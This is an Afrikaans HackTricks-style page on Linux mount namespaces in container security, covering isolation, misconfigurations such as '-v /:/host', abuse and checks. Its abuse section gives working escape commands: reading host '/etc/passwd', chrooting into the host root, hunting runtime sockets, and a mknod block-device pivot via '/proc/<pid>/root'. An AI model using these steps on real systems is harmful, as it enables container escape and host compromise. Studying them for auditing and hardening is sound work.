# Mount Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Oorsig

Die mount namespace beheer die **mount table** wat 'n proses sien. Dit is een van die belangrikste container-isolasie-eienskappe omdat die root filesystem, bind mounts, tmpfs mounts, procfs view, sysfs exposure, en baie runtime-spesifieke helper mounts almal deur daardie mount table uitgedruk word. Twee prosesse kan albei toegang hê tot `/`, `/proc`, `/sys`, of `/tmp`, maar waarna daardie paaie verwys hang af van die mount namespace waarin hulle is.

Vanuit 'n container-security-perspektief is die mount namespace dikwels die verskil tussen "dit is 'n netjies voorbereide toepassings-filsisteem" en "hierdie proses kan die host filesystem direk sien of beïnvloed". Daarom draai bind mounts, `hostPath` volumes, privileged mount operations, en lees/skryf-toeganklike `/proc` of `/sys` blootstellings almal om hierdie namespace.

## Werking

Wanneer 'n runtime 'n container begin, skep dit gewoonlik 'n vars mount namespace, berei 'n root filesystem vir die container voor, mounte procfs en ander helper-filesystems soos nodig, en voeg dan opsioneel bind mounts, tmpfs mounts, secrets, config maps, of host paths by. Sodra daardie proses binne die namespace hardloop, is die stel mounts wat dit sien grotendeels ontkoppel van die host se standaardweergawes. Die host kan nog steeds die werklike onderliggende filesystem sien, maar die container sien die weergawe wat deur die runtime vir dit saamgestel is.

Dit is kragtig omdat dit die container laat glo dit het sy eie root filesystem selfs al bestuur die host steeds alles. Dit is ook gevaarlik, want as die runtime die verkeerde mount blootstel, kry die proses skielik sigbaarheid in host-resources wat die res van die sekuriteitsmodel moontlik nie ontwerp is om te beskerm nie.

## Laboratorium

Jy kan 'n privaat mount namespace skep met:
```bash
sudo unshare --mount --fork bash
mount --make-rprivate /
mkdir -p /tmp/ns-lab
mount -t tmpfs tmpfs /tmp/ns-lab
mount | grep ns-lab
```
As jy 'n ander shell buite daardie namespace oopmaak en die mount-tabel ondersoek, sal jy sien dat die tmpfs-mount slegs binne die geïsoleerde mount-namespace bestaan. Dit is 'n nuttige oefening omdat dit wys dat mount-isolasie nie net abstrakte teorie is nie; die kernel toon letterlik 'n ander mount-tabel aan die proses.
As jy 'n ander shell buite daardie namespace oopmaak en die mount-tabel ondersoek, sal die tmpfs-mount slegs binne die geïsoleerde mount-namespace bestaan.

Binne containers, 'n vinnige vergelyking is:
```bash
docker run --rm debian:stable-slim mount | head
docker run --rm -v /:/host debian:stable-slim mount | grep /host
```
Die tweede voorbeeld demonstreer hoe maklik dit is dat ’n runtime-konfigurasie ’n groot gaping deur die lêerstelselgrens kan slaan.

## Runtime Usage

Docker, Podman, containerd-gebaseerde stacks en CRI-O vertrou almal op ’n privaat mount-namespace vir normale kontainers. Kubernetes bou bo-op dieselfde meganisme vir volumes, projected secrets, config maps, en `hostPath` mounts. Incus/LXC-omgewings vertrou ook swaar op mount namespaces, veral omdat stelselkontainers dikwels ryker en meer masjienagtige lêerstelsels blootstel as toepassingskontainers.

Dit beteken dat wanneer jy ’n kontainer-lêerstelselprobleem hersien, jy gewoonlik nie na ’n geïsoleerde Docker-kwaaltjie kyk nie. Jy kyk na ’n mount-namespace en runtime-konfigurasieprobleem wat deur watter platform ook al die werkbelasting geloods het, uitgedruk word.

## Konfigurasiefoute

Die duidelikste en gevaarlikste fout is om die host-root-lêerstelsel of ’n ander sensitiewe host-pad deur ’n bind mount bloot te stel, byvoorbeeld `-v /:/host` of ’n writable `hostPath` in Kubernetes. Op daardie punt is die vraag nie meer "can the container somehow escape?" nie, maar eerder "how much useful host content is already directly visible and writable?" ’n Writable host bind mount verander dikwels die res van die exploit in ’n eenvoudige saak van lêerplasing, chrooting, config-modifikasie, of runtime socket-ontdekking.

’n Ander algemene probleem is om host `/proc` of `/sys` bloot te stel op maniere wat die veiliger kontainer-uitsig omseil. Hierdie lêerstelsels is nie gewone data-mounts nie; dit is koppelvlakke na kernel- en prosesstaat. As die werkbelasting direk by die host-weergawes uitkom, hou baie van die aannames agter kontainer-hardening op om skoon toe te pas.

Read-only protections matter too. ’n Read-only root filesystem beveilig nie magies ’n kontainer nie, maar dit verwyder ’n groot hoeveelheid aanvaller-staging-ruimte en maak persistence, helper-binary placement, en config tampering moeiliker. Omgekeerd gee ’n writable root of writable host bind mount ’n aanvaller ruimte om die volgende stap voor te berei.

## Misbruik

Wanneer die mount-namespace misbruik word, doen aanvallers gewoonlik een van vier dinge. Hulle **read host data** wat buite die kontainer moes gebly het. Hulle **modify host configuration** deur writable bind mounts. Hulle **mount or remount additional resources** as capabilities en seccomp dit toelaat. Of hulle **reach powerful sockets and runtime state directories** wat hulle toelaat om die kontainerplatform self vir meer toegang te vra.

As die kontainer reeds die host-lêerstelsel kan sien, verander die res van die sekuriteitsmodel onmiddellik.

Wanneer jy ’n vermoedelike host bind mount het, bevestig eers wat beskikbaar is en of dit writable is:
```bash
mount | grep -E ' /host| /mnt| /rootfs|bind'
find /host -maxdepth 2 -ls 2>/dev/null | head -n 50
touch /host/tmp/ht_test 2>/dev/null && echo "host write works"
```
As die gasheer se root-lêerstelsel as read-write gemonteer is, is direkte toegang tot die gasheer dikwels so eenvoudig soos:
```bash
ls -la /host
cat /host/etc/passwd | head
chroot /host /bin/bash 2>/dev/null || echo "chroot failed"
```
As die doel bevoorregte runtime-toegang is eerder as direkte chrooting, lys sockets en runtime-toestand:
```bash
find /host/run /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
find /host -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
```
As `CAP_SYS_ADMIN` teenwoordig is, toets ook of nuwe mounts van binne die container geskep kan word:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -o bind /host /tmp/m 2>/dev/null && echo "bind mount works"
```
### Volledige Voorbeeld: Two-Shell `mknod` Pivot

'n Meer gespesialiseerde misbruikpad verskyn wanneer die root-gebruiker in die container bloktoestelle kan skep, die gasheer en container 'n gebruikersidentiteit op 'n bruikbare wyse deel, en die aanvaller reeds 'n lae-privilegie-voetingspunt op die gasheer het. In daardie situasie kan die container 'n toestelnode skep soos `/dev/sda`, en die lae-privilegie-gebruiker op die gasheer kan dit later deur `/proc/<pid>/root/` vir die ooreenstemmende container-proses lees.

Binne die container:
```bash
cd /
mknod sda b 8 0
chmod 777 sda
echo 'augustus:x:1000:1000:augustus:/home/augustus:/bin/bash' >> /etc/passwd
/bin/sh
```
Vanaf die host, as die ooreenstemmende low-privilege user nadat die container shell PID opgespoor is:
```bash
ps -auxf | grep /bin/sh
grep -a 'HTB{' /proc/<pid>/root/sda
```
Die belangrike les is nie die presiese CTF string-soektog nie. Dit is dat mount-namespace-blootstelling deur `/proc/<pid>/root/` 'n host-gebruiker kan toelaat om deur die container geskepte device nodes te hergebruik, selfs wanneer cgroup device policy direkte gebruik binne die container self verhoed het.

## Kontroles

Hierdie kommando's is daar om vir jou die lêerstelsel-uitsig te wys waarin die huidige proses werklik leef. Die doel is om host-afgeleide mounts, skryfbare sensitiewe paaie, en enigiets wat wyer lyk as 'n normale application container root filesystem, raak te sien.
```bash
mount                               # Simple mount table overview
findmnt                             # Structured mount tree with source and target
cat /proc/self/mountinfo | head -n 40   # Kernel-level mount details
```
Wat interessant is hier:

- Bind mounts vanaf die host, veral `/`, `/proc`, `/sys`, runtime state-lêergidse of socket-ligginge, behoort onmiddellik uit te steek.
- Onverwagte read-write mounts is gewoonlik belangriker as 'n groot aantal read-only helper mounts.
- `mountinfo` is dikwels die beste plek om te sien of 'n pad werklik host-derived of overlay-backed is.

Hierdie kontroles bepaal **watter hulpbronne in hierdie namespace sigbaar is**, **watter daarvan host-derived is**, en **watter daarvan skryfbaar of sekuriteitsgevoelig is**.
{{#include ../../../../../banners/hacktricks-training.md}}
